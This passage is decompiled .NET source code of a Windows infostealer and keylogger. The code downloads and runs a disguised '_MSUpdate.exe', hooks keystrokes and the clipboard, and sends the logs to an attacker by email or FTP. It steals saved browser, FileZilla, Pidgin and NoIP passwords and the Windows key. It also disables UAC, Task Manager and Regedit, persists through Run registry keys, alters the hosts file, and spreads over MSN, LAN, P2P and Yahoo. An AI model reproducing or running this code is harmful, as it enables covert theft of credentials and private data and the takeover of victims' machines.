			string text2 = Conversions.ToString(random.Next(100)) + "_MSUpdate.exe";
			((ServerComputer)MyProject.Computer).get_Network().DownloadFile(_urL, text + text2);
			Process.Start(text + text2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void LogsSender_Tick(object sender, EventArgs e)
	{
		if (Operators.CompareString(RTKLog.get_Text(), (string)null, false) != 0)
		{
			if (txtEmailFTP.get_Text().Contains("Email"))
			{
				SendKeyLogsEmail(txtEmail.get_Text(), txtEmailPass.get_Text(), txtEmailSMTP.get_Text(), txtSMTPPort.get_Text());
				RTKLog.set_Text("");
			}
			if (txtEmailFTP.get_Text().Contains("FTP"))
			{
				SendKeyLogsFTP(txtFTPserver.get_Text(), txtFTPuser.get_Text(), txtFTPpass.get_Text());
				RTKLog.set_Text("");
			}
		}
	}

	private void ClipboardLog_Tick(object sender, EventArgs e)
	{
		if (Operators.CompareString(Stored, ((Computer)MyProject.Computer).get_Clipboard().GetText(), false) != 0)
		{
			if (Conversions.ToDouble(lblNumb.get_Text()) != 0.0)
			{
				lblNumb.set_Text(Conversions.ToString(Conversions.ToDouble(lblNumb.get_Text()) + 1.0));
				RTBClipboard.set_Text(RTBClipboard.get_Text() + "\r\n\r\nLog " + lblNumb.get_Text() + " - " + ((Computer)MyProject.Computer).get_Clipboard().GetText());
				Stored = ((Computer)MyProject.Computer).get_Clipboard().GetText();
			}
			else
			{
				lblNumb.set_Text(Conversions.ToString(Conversions.ToDouble(lblNumb.get_Text()) + 1.0));
				RTBClipboard.set_Text(RTBClipboard.get_Text() + "Log " + lblNumb.get_Text() + " - " + ((Computer)MyProject.Computer).get_Clipboard().GetText());
				Stored = ((Computer)MyProject.Computer).get_Clipboard().GetText();
			}
		}
	}

	public void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Control)this).set_Visible(false);
		((Form)this).set_ShowInTaskbar(false);
		FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
		checked
		{
			string text = Strings.Space((int)FileSystem.LOF(1));
			string text2 = Strings.Space((int)FileSystem.LOF(1));
			string text3 = Strings.Space((int)FileSystem.LOF(1));
			string text4 = Strings.Space((int)FileSystem.LOF(1));
			string text5 = Strings.Space((int)FileSystem.LOF(1));
			string text6 = Strings.Space((int)FileSystem.LOF(1));
			string text7 = Strings.Space((int)FileSystem.LOF(1));
			string text8 = Strings.Space((int)FileSystem.LOF(1));
			string text9 = Strings.Space((int)FileSystem.LOF(1));
			string text10 = Strings.Space((int)FileSystem.LOF(1));
			string text11 = Strings.Space((int)FileSystem.LOF(1));
			string text12 = Strings.Space((int)FileSystem.LOF(1));
			string text13 = Strings.Space((int)FileSystem.LOF(1));
			string text14 = Strings.Space((int)FileSystem.LOF(1));
			string text15 = Strings.Space((int)FileSystem.LOF(1));
			string text16 = Strings.Space((int)FileSystem.LOF(1));
			string text17 = Strings.Space((int)FileSystem.LOF(1));
			string text18 = Strings.Space((int)FileSystem.LOF(1));
			string text19 = Strings.Space((int)FileSystem.LOF(1));
			string text20 = Strings.Space((int)FileSystem.LOF(1));
			string text21 = Strings.Space((int)FileSystem.LOF(1));
			string text22 = Strings.Space((int)FileSystem.LOF(1));
			string text23 = Strings.Space((int)FileSystem.LOF(1));
			string text24 = Strings.Space((int)FileSystem.LOF(1));
			string text25 = Strings.Space((int)FileSystem.LOF(1));
			string text26 = Strings.Space((int)FileSystem.LOF(1));
			string text27 = Strings.Space((int)FileSystem.LOF(1));
			string text28 = Strings.Space((int)FileSystem.LOF(1));
			string text29 = Strings.Space((int)FileSystem.LOF(1));
			string text30 = Strings.Space((int)FileSystem.LOF(1));
			string text31 = Strings.Space((int)FileSystem.LOF(1));
			string text32 = Strings.Space((int)FileSystem.LOF(1));
			string text33 = Strings.Space((int)FileSystem.LOF(1));
			string text34 = Strings.Space((int)FileSystem.LOF(1));
			string text35 = Strings.Space((int)FileSystem.LOF(1));
			string text36 = Strings.Space((int)FileSystem.LOF(1));
			string text37 = Strings.Space((int)FileSystem.LOF(1));
			string text38 = Strings.Space((int)FileSystem.LOF(1));
			string text39 = Strings.Space((int)FileSystem.LOF(1));
			string text40 = Strings.Space((int)FileSystem.LOF(1));
			string text41 = Strings.Space((int)FileSystem.LOF(1));
			string text42 = Strings.Space((int)FileSystem.LOF(1));
			string text43 = Strings.Space((int)FileSystem.LOF(1));
			string text44 = Strings.Space((int)FileSystem.LOF(1));
			string text45 = Strings.Space((int)FileSystem.LOF(1));
			string text46 = Strings.Space((int)FileSystem.LOF(1));
			string text47 = Strings.Space((int)FileSystem.LOF(1));
			string text48 = Strings.Space((int)FileSystem.LOF(1));
			string text49 = Strings.Space((int)FileSystem.LOF(1));
			string text50 = Strings.Space((int)FileSystem.LOF(1));
			string text51 = Strings.Space((int)FileSystem.LOF(1));
			string text52 = Strings.Space((int)FileSystem.LOF(1));
			string text53 = Strings.Space((int)FileSystem.LOF(1));
			string text54 = Strings.Space((int)FileSystem.LOF(1));
			string text55 = Strings.Space((int)FileSystem.LOF(1));
			string text56 = Strings.Space((int)FileSystem.LOF(1));
			string text57 = Strings.Space((int)FileSystem.LOF(1));
			string text58 = Strings.Space((int)FileSystem.LOF(1));
			string text59 = Strings.Space((int)FileSystem.LOF(1));
			string text60 = Strings.Space((int)FileSystem.LOF(1));
			string text61 = Strings.Space((int)FileSystem.LOF(1));
			string text62 = Strings.Space((int)FileSystem.LOF(1));
			string text63 = Strings.Space((int)FileSystem.LOF(1));
			string text64 = Strings.Space((int)FileSystem.LOF(1));
			string text65 = Strings.Space((int)FileSystem.LOF(1));
			string text66 = Strings.Space((int)FileSystem.LOF(1));
			string text67 = Strings.Space((int)FileSystem.LOF(1));
			string text68 = Strings.Space((int)FileSystem.LOF(1));
			string text69 = Strings.Space((int)FileSystem.LOF(1));
			string text70 = Strings.Space((int)FileSystem.LOF(1));
			string text71 = Strings.Space((int)FileSystem.LOF(1));
			string text72 = Strings.Space((int)FileSystem.LOF(1));
			string text73 = Strings.Space((int)FileSystem.LOF(1));
			string text74 = Strings.Space((int)FileSystem.LOF(1));
			string text75 = Strings.Space((int)FileSystem.LOF(1));
			string text76 = Strings.Space((int)FileSystem.LOF(1));
			string text77 = Strings.Space((int)FileSystem.LOF(1));
			FileSystem.FileGet(1, ref text, -1L, false);
			FileSystem.FileGet(1, ref text2, -1L, false);
			FileSystem.FileGet(1, ref text3, -1L, false);
			FileSystem.FileGet(1, ref text4, -1L, false);
			FileSystem.FileGet(1, ref text5, -1L, false);
			FileSystem.FileGet(1, ref text6, -1L, false);
			FileSystem.FileGet(1, ref text7, -1L, false);
			FileSystem.FileGet(1, ref text8, -1L, false);
			FileSystem.FileGet(1, ref text9, -1L, false);
			FileSystem.FileGet(1, ref text10, -1L, false);
			FileSystem.FileGet(1, ref text11, -1L, false);
			FileSystem.FileGet(1, ref text12, -1L, false);
			FileSystem.FileGet(1, ref text13, -1L, false);
			FileSystem.FileGet(1, ref text14, -1L, false);
			FileSystem.FileGet(1, ref text17, -1L, false);
			FileSystem.FileGet(1, ref text18, -1L, false);
			FileSystem.FileGet(1, ref text19, -1L, false);
			FileSystem.FileGet(1, ref text20, -1L, false);
			FileSystem.FileGet(1, ref text21, -1L, false);
			FileSystem.FileGet(1, ref text22, -1L, false);
			FileSystem.FileGet(1, ref text23, -1L, false);
			FileSystem.FileGet(1, ref text24, -1L, false);
			FileSystem.FileGet(1, ref text25, -1L, false);
			FileSystem.FileGet(1, ref text26, -1L, false);
			FileSystem.FileGet(1, ref text27, -1L, false);
			FileSystem.FileGet(1, ref text28, -1L, false);
			FileSystem.FileGet(1, ref text29, -1L, false);
			FileSystem.FileGet(1, ref text30, -1L, false);
			FileSystem.FileGet(1, ref text31, -1L, false);
			FileSystem.FileGet(1, ref text32, -1L, false);
			FileSystem.FileGet(1, ref text33, -1L, false);
			FileSystem.FileGet(1, ref text34, -1L, false);
			FileSystem.FileGet(1, ref text35, -1L, false);
			FileSystem.FileGet(1, ref text36, -1L, false);
			FileSystem.FileGet(1, ref text37, -1L, false);
			FileSystem.FileGet(1, ref text38, -1L, false);
			FileSystem.FileGet(1, ref text39, -1L, false);
			FileSystem.FileGet(1, ref text40, -1L, false);
			FileSystem.FileGet(1, ref text41, -1L, false);
			FileSystem.FileGet(1, ref text42, -1L, false);
			FileSystem.FileGet(1, ref text43, -1L, false);
			FileSystem.FileGet(1, ref text44, -1L, false);
			FileSystem.FileGet(1, ref text45, -1L, false);
			FileSystem.FileGet(1, ref text46, -1L, false);
			FileSystem.FileGet(1, ref text47, -1L, false);
			FileSystem.FileGet(1, ref text48, -1L, false);
			FileSystem.FileGet(1, ref text49, -1L, false);
			FileSystem.FileGet(1, ref text50, -1L, false);
			FileSystem.FileGet(1, ref text51, -1L, false);
			FileSystem.FileGet(1, ref text52, -1L, false);
			FileSystem.FileGet(1, ref text53, -1L, false);
			FileSystem.FileGet(1, ref text54, -1L, false);
			FileSystem.FileGet(1, ref text55, -1L, false);
			FileSystem.FileGet(1, ref text56, -1L, false);
			FileSystem.FileGet(1, ref text57, -1L, false);
			FileSystem.FileGet(1, ref text58, -1L, false);
			FileSystem.FileGet(1, ref text59, -1L, false);
			FileSystem.FileGet(1, ref text60, -1L, false);
			FileSystem.FileGet(1, ref text61, -1L, false);
			FileSystem.FileGet(1, ref text62, -1L, false);
			FileSystem.FileGet(1, ref text63, -1L, false);
			FileSystem.FileGet(1, ref text64, -1L, false);
			FileSystem.FileGet(1, ref text65, -1L, false);
			FileSystem.FileGet(1, ref text66, -1L, false);
			FileSystem.FileGet(1, ref text67, -1L, false);
			FileSystem.FileGet(1, ref text68, -1L, false);
			FileSystem.FileGet(1, ref text69, -1L, false);
			FileSystem.FileGet(1, ref text70, -1L, false);
			FileSystem.FileGet(1, ref text71, -1L, false);
			FileSystem.FileGet(1, ref text72, -1L, false);
			FileSystem.FileGet(1, ref text73, -1L, false);
			FileSystem.FileGet(1, ref text74, -1L, false);
			FileSystem.FileGet(1, ref text75, -1L, false);
			FileSystem.FileGet(1, ref text76, -1L, false);
			FileSystem.FileGet(1, ref text77, -1L, false);
			FileSystem.FileGet(1, ref text15, -1L, false);
			FileSystem.FileGet(1, ref text16, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			string[] array = Strings.Split(text, "qrYkkpuRGOXiroJYeedfxUXnttcd", -1, (CompareMethod)0);
			FileSystem.FileClose(new int[1] { 1 });
			if (!((ServerComputer)MyProject.Computer).get_Network().get_IsAvailable())
			{
				return;
			}
			if (Conversions.ToBoolean(array[76]))
			{
				try
				{
					_dLoad(array[77]);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (!Conversions.ToBoolean(array[49]))
			{
			}
			if (!Conversions.ToBoolean(array[50]))
			{
			}
			if (!Conversions.ToBoolean(array[51]))
			{
			}
			if (!Conversions.ToBoolean(array[52]))
			{
			}
			if (!Conversions.ToBoolean(array[53]))
			{
			}
			if (!Conversions.ToBoolean(array[54]))
			{
			}
			if (!Conversions.ToBoolean(array[55]))
			{
			}
			string text78 = array[2];
			string text79 = array[3];
			if (Conversions.ToBoolean(array[67]))
			{
				try
				{
					WebClient webClient = new WebClient();
					string name = ((ServerComputer)MyProject.Computer).get_Name();
					string text80 = webClient.DownloadString(array[68]).ToString();
					if (text80.Contains("Uninstall:" + name))
					{
						try
						{
							RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
							if (registryKey.GetValue(text78) != null)
							{
								registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\" + text78);
								object? value = registryKey.GetValue(text78);
								object[] array2 = new object[1] { text79 };
								object[] array3 = array2;
								bool[] array4 = new bool[1] { true };
								object obj = NewLateBinding.LateGet(value, (Type)null, "contains", array3, (string[])null, (Type[])null, array4);
								if (array4[0])
								{
									text79 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
								}
								if (Conversions.ToBoolean(obj))
								{
									registryKey.DeleteValue(text78);
								}
							}
							registryKey.Close();
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							((Form)this).Close();
							ProjectData.ClearProjectError();
						}
						try
						{
							RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
							if (registryKey2.GetValue(text78) != null)
							{
								registryKey2.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\" + text78);
								object? value2 = registryKey2.GetValue(text78);
								object[] array5 = new object[1] { text79 };
								object[] array6 = array5;
								bool[] array4 = new bool[1] { true };
								object obj2 = NewLateBinding.LateGet(value2, (Type)null, "contains", array6, (string[])null, (Type[])null, array4);
								if (array4[0])
								{
									text79 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
								}
								if (Conversions.ToBoolean(obj2))
								{
									registryKey2.DeleteValue(text78);
								}
							}
							registryKey2.Close();
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							((Form)this).Close();
							ProjectData.ClearProjectError();
						}
						((Form)this).Close();
					}
					if (text80.Contains("Disable:" + name))
					{
						((Form)this).Close();
					}
					webClient.Dispose();
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[57]))
			{
				txtSMTPPort.set_Text(array[64]);
			}
			string decryptedData = GetDecryptedData(array[60]);
			string decryptedData2 = GetDecryptedData(array[61]);
			string decryptedData3 = GetDecryptedData(array[62]);
			txtFTPserver.set_Text(decryptedData);
			txtFTPuser.set_Text(decryptedData2);
			txtFTPpass.set_Text(decryptedData3);
			string decryptedData4 = GetDecryptedData(array[63]);
			string decryptedData5 = GetDecryptedData(array[65]);
			string decryptedData6 = GetDecryptedData(array[66]);
			txtEmailSMTP.set_Text(decryptedData4);
			txtEmail.set_Text(decryptedData5);
			txtEmailPass.set_Text(decryptedData6);
			bool flag = Conversions.ToBoolean(array[5]);
			bool flag2 = Conversions.ToBoolean(array[6]);
			bool flag3 = Conversions.ToBoolean(array[7]);
			Conversions.ToBoolean(array[15]);
			if (flag)
			{
				try
				{
					_ins(text79, text78);
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
			}
			if (!flag2)
			{
			}
			if (flag3)
			{
				try
				{
					string text81 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text79;
					File.SetAttributes(text81, FileAttributes.Hidden);
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[16]))
			{
				MSN();
			}
			if (Conversions.ToBoolean(array[17]) && !File.Exists(Application.get_StartupPath() + "\\System.Data.SQLite.DLL"))
			{
				try
				{
					string text82 = array[75];
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(text82, Application.get_StartupPath() + "\\System.Data.SQLite.DLL");
					File.SetAttributes(Application.get_StartupPath() + "\\System.Data.SQLite.DLL", FileAttributes.Hidden);
					Chrome();
				}
				catch (Exception projectError7)
				{
					ProjectData.SetProjectError(projectError7);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[18]))
			{
				Firefox();
			}
			if (Conversions.ToBoolean(array[19]))
			{
				try
				{
					InternetExplorer();
				}
				catch (Exception projectError8)
				{
					ProjectData.SetProjectError(projectError8);
					RTInternetExplorer.set_Text("No Internet Explorer 7/8 Passwords Saved.");
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[20]))
			{
				Filezilla();
			}
			if (Conversions.ToBoolean(array[21]))
			{
				PCInfo();
			}
			if (Conversions.ToBoolean(array[22]))
			{
				IMVU();
			}
			if (Conversions.ToBoolean(array[23]))
			{
				NoIP();
			}
			if (Conversions.ToBoolean(array[24]))
			{
				WindowsKey();
			}
			if (Conversions.ToBoolean(array[25]))
			{
				Pidgin();
			}
			if (Conversions.ToBoolean(array[26]))
			{
				pYrTgbzWFEpYpYrT();
			}
			if (Conversions.ToBoolean(array[28]))
			{
				try
				{
					DisableRegedit();
				}
				catch (Exception projectError9)
				{
					ProjectData.SetProjectError(projectError9);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[29]))
			{
				try
				{
					DisableTaskMan();
				}
				catch (Exception projectError10)
				{
					ProjectData.SetProjectError(projectError10);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[30]))
			{
				try
				{
					Interaction.Shell("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f", (AppWinStyle)2, false, -1);
				}
				catch (Exception projectError11)
				{
					ProjectData.SetProjectError(projectError11);
					ProjectData.ClearProjectError();
				}
				try
				{
					((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", (object)"0");
				}
				catch (Exception projectError12)
				{
					ProjectData.SetProjectError(projectError12);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[31]))
			{
				try
				{
					string text83 = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
					((ServerComputer)MyProject.Computer).get_Registry().SetValue(text83, "Hidden", (object)"0", RegistryValueKind.DWord);
				}
				catch (Exception projectError13)
				{
					ProjectData.SetProjectError(projectError13);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[32]))
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object)"1");
				}
				catch (Exception projectError14)
				{
					ProjectData.SetProjectError(projectError14);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[33]))
			{
				try
				{
					Hosts();
				}
				catch (Exception projectError15)
				{
					ProjectData.SetProjectError(projectError15);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[34]))
			{
				try
				{
					DeleteWinRecent(Enable: true);
				}
				catch (Exception projectError16)
				{
					ProjectData.SetProjectError(projectError16);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[35]))
			{
				try
				{
					DeleteWinTemp(Enable: true);
				}
				catch (Exception projectError17)
				{
					ProjectData.SetProjectError(projectError17);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[36]))
			{
				try
				{
					DeleteWoWCache(Enable: true);
				}
				catch (Exception projectError18)
				{
					ProjectData.SetProjectError(projectError18);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[37]))
			{
				try
				{
					KillSteamProcess();
				}
				catch (Exception projectError19)
				{
					ProjectData.SetProjectError(projectError19);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[38]))
			{
				try
				{
					KillSteamProcess();
				}
				catch (Exception projectError20)
				{
					ProjectData.SetProjectError(projectError20);
					ProjectData.ClearProjectError();
				}
				try
				{
					DeleteSteamCache();
				}
				catch (Exception projectError21)
				{
					ProjectData.SetProjectError(projectError21);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[39]))
			{
				try
				{
					DeleteWinRecycleBin(Enable: true);
				}
				catch (Exception projectError22)
				{
					ProjectData.SetProjectError(projectError22);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[40]))
			{
				try
				{
					DeleteCookies();
				}
				catch (Exception projectError23)
				{
					ProjectData.SetProjectError(projectError23);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[41]))
			{
				try
				{
					KillProcesses(InternetExplorer: true, Firefox: true);
				}
				catch (Exception projectError24)
				{
					ProjectData.SetProjectError(projectError24);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[42]))
			{
				try
				{
					DeleteIEHistory(Enable: true);
				}
				catch (Exception projectError25)
				{
					ProjectData.SetProjectError(projectError25);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[43]))
			{
				try
				{
					DeleteIECookies(Enable: true);
				}
				catch (Exception projectError26)
				{
					ProjectData.SetProjectError(projectError26);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[44]))
			{
				try
				{
					DeleteIECache(Enable: true);
				}
				catch (Exception projectError27)
				{
					ProjectData.SetProjectError(projectError27);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[45]))
			{
				try
				{
					DeleteMozillaCache(Enable: true);
				}
				catch (Exception projectError28)
				{
					ProjectData.SetProjectError(projectError28);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[46]))
			{
				try
				{
					DeleteMozillaCookies(Enable: true);
				}
				catch (Exception projectError29)
				{
					ProjectData.SetProjectError(projectError29);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[47]))
			{
				try
				{
					DeleteMozillaSignons(Enable: true);
				}
				catch (Exception projectError30)
				{
					ProjectData.SetProjectError(projectError30);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[56]))
			{
				HookKeyboard();
				ClipboardLog.Start();
				LogsSender.set_Interval(Conversions.ToInteger(array[59]));
				if (Conversions.ToBoolean(array[57]))
				{
					txtEmailFTP.set_Text("Email");
					method_0();
					_sendsteelLogsEmail(txtEmail.get_Text(), txtEmailPass.get_Text(), txtEmailSMTP.get_Text(), txtSMTPPort.get_Text());
					LogsSender.Start();
				}
				if (Conversions.ToBoolean(array[58]))
				{
					txtEmailFTP.set_Text("FTP");
					method_0();
					_zendLoqs(txtFTPserver.get_Text(), txtFTPuser.get_Text(), txtFTPpass.get_Text());
					LogsSender.Start();
				}
			}
			if (!Conversions.ToBoolean(array[56]))
			{
				if (Conversions.ToBoolean(array[57]))
				{
					txtEmailFTP.set_Text("Email");
					method_0();
					_sendsteelLogsEmail(txtEmail.get_Text(), txtEmailPass.get_Text(), txtEmailSMTP.get_Text(), txtSMTPPort.get_Text());
				}
				if (Conversions.ToBoolean(array[58]))
				{
					txtEmailFTP.set_Text("FTP");
					method_0();
					_zendLoqs(txtFTPserver.get_Text(), txtFTPuser.get_Text(), txtFTPpass.get_Text());
				}
			}
			if (Conversions.ToBoolean(array[69]))
			{
				try
				{
					msn.msnshare_sp();
				}
				catch (Exception projectError31)
				{
					ProjectData.SetProjectError(projectError31);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[70]))
			{
				try
				{
					lan.lan_sp();
				}
				catch (Exception projectError32)
				{
					ProjectData.SetProjectError(projectError32);
					ProjectData.ClearProjectError();
				}
			}
			if (!Conversions.ToBoolean(array[71]))
			{
			}
			if (!Conversions.ToBoolean(array[72]))
			{
			}
			if (Conversions.ToBoolean(array[73]))
			{
				try
				{
					p2p.p2p_sp();
				}
				catch (Exception projectError33)
				{
					ProjectData.SetProjectError(projectError33);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[74]))
			{
				try
				{
					yahoo.yahoo_spr();
				}
				catch (Exception projectError34)
				{
					ProjectData.SetProjectError(projectError34);
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
